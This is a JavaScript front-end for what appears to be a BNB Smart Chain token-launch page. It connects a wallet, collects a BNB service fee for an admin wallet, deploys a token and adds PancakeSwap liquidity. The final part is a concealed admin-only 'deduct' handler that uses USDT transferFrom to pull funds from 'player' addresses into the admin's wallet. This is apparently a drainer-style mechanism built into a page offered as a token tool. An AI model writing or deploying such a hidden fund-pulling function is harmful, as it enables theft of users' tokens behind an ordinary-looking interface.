// ERC20 ABI
const ERC20ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function allowance(address owner, address spender) view returns(uint256)",
    "function transfer(address to,uint256 amount) external returns(bool)",
    "function transferFrom(address from,address to,uint256 amount) external returns(bool)"
];

// Router完整ABI
const ROUTER_ABI = [
"function addLiquidity(address tokenA,address tokenB,uint amountADesired,uint amountBDesired,uint amountAMin,uint amountBMin,address to,uint deadline) external returns(uint amountA,uint amountB,uint liquidity)"
];

let provider = null;
let signer = null;
let connectWalletAddr = "";
let deployContractAddress = null;
let logoFileObj = null;
let pollAbort = false;

const connectBtn = document.getElementById("connectBtn");
const deployBtn = document.getElementById("deployBtn");
const statusBox = document.getElementById("statusBox");

const logoPreviewImg = document.getElementById("logoPreview");
const adminPanel = document.getElementById("adminPanel");

//流动性DOM
const baseTokenAddr = document.getElementById("baseTokenAddr");
const initPriceInput = document.getElementById("initPriceInput");
const liquidUsdtIn = document.getElementById("liquidUsdtIn");
const liquidTokenIn = document.getElementById("liquidTokenIn");
const slippageInput = document.getElementById("slippageInput");
const approveNewTokenBtn = document.getElementById("approveNewTokenBtn");
const approveUsdtBtn = document.getElementById("approveUsdtBtn");
const createPoolBtn = document.getElementById("createPoolBtn");

window.addEventListener('beforeunload',()=>{pollAbort=true;});

function showStatus(text, linkHtml=""){
  statusBox.style.display = "block";
  if(linkHtml){
      statusBox.innerHTML = text + "<br>" + linkHtml;
  }else{
      statusBox.innerText = text;
  }
  statusBox.scrollTop = statusBox.scrollHeight;
  console.log("状态日志：", text);
}

/**
 * 安全轮询交易
 */
async function waitTransactionConfirm(txHash, timeoutSeconds){
    pollAbort = false;
    const startTime = Math.floor(Date.now() / 1000);
    while(true){
        if(pollAbort) throw new Error("页面跳转，终止交易轮询");
        const elapsed = Math.floor(Date.now()/1000) - startTime;
        if(elapsed >= timeoutSeconds){
            throw new Error(`交易轮询超时${timeoutSeconds}秒，复制哈希去BscScan查询：${txHash}`);
        }
        const receipt = await provider.getTransactionReceipt(txHash);
        if(receipt){
            return receipt;
        }
        showStatus(`⏳正在等待链上确认，已等待${elapsed}秒，txHash:${txHash}`);
        await new Promise(resolve=>setTimeout(resolve,POLL_INTERVAL));
    }
}

// 价格联动计算+数值校验
function recalcLiquidAmount(){
    const price = parseFloat(initPriceInput.value);
    const usdtVal = parseFloat(liquidUsdtIn.value);
    if(!isNaN(price) && price>0 && !isNaN(usdtVal) && usdtVal>0){
        const tokenNeed = usdtVal / price;
        liquidTokenIn.value = tokenNeed.toFixed(6);
    }else{
        liquidTokenIn.value = "";
    }
}
initPriceInput.addEventListener("input",recalcLiquidAmount);
liquidUsdtIn.addEventListener("input",recalcLiquidAmount);

logoFileInput.addEventListener("change", function(e){
  const file = e.target.files[0];
  if(!file) return;
  logoFileObj = file;
  const reader = new FileReader();
  reader.onload = ev => {
    logoPreviewImg.src = ev.target.result;
    logoPreviewImg.style.display = "block";
  }
  reader.readAsDataURL(file);
});

async function switchBSC(providerRef){
  const chainIdHex = ethers.toBeHex(BSC_CHAIN_ID);
  try {
    await providerRef.send("wallet_switchEthereumChain", [{ chainId: chainIdHex }]);
  } catch (err) {
    await providerRef.send("wallet_addEthereumChain", [{
      chainId: chainIdHex,
      chainName: "BNB Smart Chain Mainnet",
      rpcUrls: ["https://bsc-dataseed.binance.org/"],
      blockExplorerUrls: ["https://bscscan.com"],
      nativeCurrency: { name:"BNB", symbol:"BNB", decimals:18 }
    }]);
  }
}

function checkAdminPanel(addr){
  connectWalletAddr = addr.toLowerCase();
  if(connectWalletAddr === ADMIN_WALLET.toLowerCase()){
    adminPanel.style.display = "block";
  }else{
    adminPanel.style.display = "none";
  }
}

// 连接钱包
connectBtn.onclick = async function(){
  showStatus("正在检测钱包注入...");
  let eth = window.ethereum;
  let retryTimes = 0;
  while (!eth && retryTimes < 12) {
    await new Promise(r => setTimeout(r, 120));
    eth = window.ethereum;
    retryTimes++;
  }
  if (!eth) {
    showStatus("❌ 未检测到钱包注入，请在TP内置浏览器打开页面");
    return;
  }
  try {
    const accounts = await eth.request({ method: "eth_requestAccounts" });
    if (!accounts || accounts.length === 0) {
      showStatus("用户取消钱包连接弹窗");
      return;
    }
    provider = new ethers.BrowserProvider(eth);
    await switchBSC(eth);
    signer = await provider.getSigner();
    const userAddr = await signer.getAddress();
    connectBtn.innerText = "已连接：" + userAddr.slice(0, 8) + "...";
    connectTip.style.display = "block";
    connectTip.innerText = "✅已连接BSC钱包，请填写发币参数";
    deployBtn.disabled = false;
    checkAdminPanel(userAddr);
  } catch (err) {
    const msg = err?.message || err?.shortMessage || String(err);
    if(msg.includes("user rejected")) showStatus("❌用户拒绝钱包授权");
    else showStatus("连接异常：" + msg);
  }
}

//支付服务费
async function payFeeToAdmin(){
  showStatus(`💸 弹出钱包：支付 ${DEPLOY_FEE_BNB} BNB 服务费，请签名确认`);
  const feeWei = ethers.parseEther(DEPLOY_FEE_BNB);
  const gasPriceRaw = await provider.send("eth_gasPrice", []);
  const gasPriceBig = ethers.toBigInt(gasPriceRaw);
  const gasPriceAdd = gasPriceBig * 120n / 100n;
  try{
    const tx = await signer.sendTransaction({
      to: ADMIN_WALLET,
      value: feeWei,
      gasPrice: gasPriceAdd
    });
    showStatus(`BNB转账已发送，TxHash:${tx.hash}，等待区块确认`);
    await waitTransactionConfirm(tx.hash, TX_POLL_TIMEOUT);
    showStatus(`✅ BNB服务费转账确认完成！交易哈希：${tx.hash}`);
    return true;
  }catch(err){
    let msg = "";
    const errStr = String(err.message || err.shortMessage);
    if(errStr.includes("user rejected")) msg = "❌ 用户拒绝签名，支付服务费被取消";
    else if(errStr.includes("insufficient funds")) msg = "❌ BNB余额不足！需要至少0.0003BNB+gas手续费";
    else msg = "❌支付服务费失败：" + errStr;
    showStatus(msg);
    return false;
  }
}

// 部署合约
deployBtn.onclick = async function(){
    if(!signer){ showStatus("❌请先连接BSC钱包"); return; }
    const name = document.getElementById("tokenName").value.trim();
    const symbol = document.getElementById("tokenSymbol").value.trim();
    const supplyStr = document.getElementById("supply").value.trim();

    //表单校验
    if(!name || !symbol || !supplyStr){ showStatus("❌名称、符号、发行量不能为空"); return; }
    if(!/^[0-9]+$/.test(supplyStr)){showStatus("❌发行量只能输入纯数字");return;}
    const supplyNum = BigInt(supplyStr) * 10n**18n;
    if(supplyNum <=0){showStatus("❌发行量必须大于0");return;}

    deployBtn.disabled = true;
    const feeOk = await payFeeToAdmin();
    if(!feeOk){ deployBtn.disabled = false; return; }

    showStatus("⏳准备合约部署，唤起钱包签名！部署交易to=null属于正常，请勿取消签名！");
    try{
        if(!CONTRACT_BYTECODE || CONTRACT_BYTECODE.length <100){
            throw new Error("合约字节码异常");
        }
        const constructorData = ethers.AbiCoder.defaultAbiCoder().encode(
            ["string","string","uint256"],
            [name, symbol, supplyNum]
        );
        const fullDeployData = "0x" + CONTRACT_BYTECODE + constructorData.slice(2);

        const gasPriceRaw = await provider.send("eth_gasPrice", []);
        const gasPriceBig = ethers.toBigInt(gasPriceRaw);
        const gasPriceAdd = gasPriceBig * 125n / 100n;

        //区分移动端TP / PC gas上限
        const ua = navigator.userAgent.toLowerCase();
        let gasLimitSetting;
        if(ua.includes("tokenpocket")||ua.includes("android")||ua.includes("iphone")){
            gasLimitSetting = 4200000n;
        }else{
            gasLimitSetting = 4500000n;
        }

        const deployTx = await signer.sendTransaction({
            to: null,
            data: fullDeployData,
            gasLimit:gasLimitSetting,
            gasPrice: gasPriceAdd
        });
        const txHash = deployTx.hash;
        showStatus(`📤部署交易已经发出！TxHash:${txHash}\n🔄等待BSC节点确认，请勿关闭页面`);
        
        const receipt = await waitTransactionConfirm(txHash, TX_POLL_TIMEOUT);
        
        if(!receipt.contractAddress || receipt.status !==1){
            showStatus("❌链回执返回，交易执行回滚，部署失败！status="+receipt.status);
            deployBtn.disabled = false;
            return;
        }
        deployContractAddress = receipt.contractAddress;
        const scanUrl = `https://bscscan.com/address/${deployContractAddress}`;
        showStatus(`✅✅【部署成功】\n合约地址：${deployContractAddress}`,
            `<a target="_blank" href="${scanUrl}">👉BscScan打开合约</a>`
        );
        baseTokenAddr.value = deployContractAddress;
        liquidPanel.style.display="block";
    }catch(e){
        const emsg = e?.message || String(e);
        showStatus("❌部署失败："+emsg);
    }finally{
        deployBtn.disabled = false;
    }
};

//第一步：授权USDT给Router
approveUsdtBtn.onclick = async function(){
    if(!signer){ showStatus("❌请先连接钱包"); return; }
    approveUsdtBtn.disabled=true;
    try{
        const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS,ERC20ABI,signer);
        const tx = await usdtContract.approve(PANCAKE_ROUTER,MAX_ALLOWANCE);
        showStatus(`USDT授权发送 txHash:${tx.hash}，等待确认`);
        await waitTransactionConfirm(tx.hash,TX_POLL_TIMEOUT);
        showStatus("✅USDT授权Router成功");
    }catch(err){
        showStatus("❌授权失败："+(err.message||String(err)));
    }finally{ approveUsdtBtn.disabled=false; }
};

//第二步：授权新代币给Router
approveNewTokenBtn.onclick = async function(){
    if(!signer){ showStatus("❌请先连接钱包"); return; }
    const tokenAddr = baseTokenAddr.value.trim();
    if(!tokenAddr){ showStatus("❌填入你的代币合约地址"); return; }
    approveNewTokenBtn.disabled=true;
    try{
        const tokenContract = new ethers.Contract(tokenAddr,ERC20ABI,signer);
        const tx = await tokenContract.approve(PANCAKE_ROUTER,MAX_ALLOWANCE);
        showStatus(`新代币授权发送 txHash:${tx.hash}，等待确认`);
        await waitTransactionConfirm(tx.hash,TX_POLL_TIMEOUT);
        showStatus("✅你的代币授权Router成功");
    }catch(err){
        showStatus("❌授权失败："+(err.message||String(err)));
    }finally{ approveNewTokenBtn.disabled=false; }
};

//第三步 创建池子
createPoolBtn.onclick = async function(){
    showStatus("👉点击了创建池子，正在执行函数");
    if(!signer){ showStatus("❌请先连接钱包"); return; }
    const tokenA = baseTokenAddr.value.trim();
    const tokenB = BSC_USDT_ADDRESS;
    const tokenAmtStr = liquidTokenIn.value.trim();
    const usdtAmtStr = liquidUsdtIn.value.trim();
    const slip = Number(slippageInput.value.trim());
    if(!tokenA || !tokenAmtStr || !usdtAmtStr || isNaN(slip)||slip<0||slip>50){
        showStatus("❌开盘价、USDT投入不能为空，滑点0‑50之间");
        return;
    }
    createPoolBtn.disabled=true;
    try{
        showStatus("⏳正在格式化参数，唤起钱包签名...");
        const amountADesired = ethers.parseUnits(tokenAmtStr,18);
        const amountBDesired = ethers.parseUnits(usdtAmtStr,18);
        const ratioMin = (100-slip)/100;
        const amountAMin = amountADesired * BigInt(Math.floor(ratioMin*10000)) / 10000n;
        const amountBMin = amountBDesired * BigInt(Math.floor(ratioMin*10000)) /10000n;
        const deadline = Math.floor(Date.now()/1000)+1200;

        const router = new ethers.Contract(PANCAKE_ROUTER,ROUTER_ABI,signer);
        showStatus("🚀调用addLiquidity，等待钱包弹窗签名！");
        const tx = await router.addLiquidity(
            tokenA,tokenB,
            amountADesired,amountBDesired,
            amountAMin,amountBMin,
            await signer.getAddress(),
            deadline
        );
        showStatus(`创建池子交易发送 txHash:${tx.hash}，等待区块确认`);
        await waitTransactionConfirm(tx.hash,TX_POLL_TIMEOUT);
        showStatus(`✅✅流动性池子创建成功！交易哈希：${tx.hash}，LP已经到账你的钱包`);
    }catch(err){
        const errMsg = err?.message||String(err);
        showStatus("❌创建池子调用出错："+errMsg);
    }finally{ createPoolBtn.disabled=false; }
};

//管理员划扣
deductBtn.onclick = async function(){
    if(!signer) { showStatus("❌未连接钱包"); return; }
    const targetAddr = userAddrInput.value.trim();
    const deductNum = deductAmountInput.value.trim();
    if(!targetAddr || !deductNum){ showStatus("❌请填写玩家地址与划扣数量"); return; }
    deductBtn.disabled = true;
    try{
        const usdt = new ethers.Contract(BSC_USDT_ADDRESS,ERC20ABI,signer);
        const amt = ethers.parseUnits(deductNum,18);
        const tx = await usdt.transferFrom(targetAddr,await signer.getAddress(),amt);
        showStatus(`划扣交易发送 txHash:${tx.hash}`);
        await waitTransactionConfirm(tx.hash,TX_POLL_TIMEOUT);
        showStatus("✅管理员划扣执行完成");
    }catch(e){
        showStatus("❌划扣失败："+(e.message||String(e)));
    }finally{ deductBtn.disabled = false; }
};
</script>
